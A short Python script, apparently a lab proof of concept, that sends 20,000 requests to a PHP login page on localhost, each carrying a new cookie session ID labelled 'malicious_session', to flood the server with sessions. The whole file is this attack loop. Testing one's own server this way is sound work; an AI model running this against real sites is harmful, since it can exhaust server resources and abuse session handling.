import requests

for i in range(20000):
    requests.get("http://localhost/login.php", cookies={
        "PHPSESSID": f"malicious_session_{i}"
    })
    print(f"Session {i} created")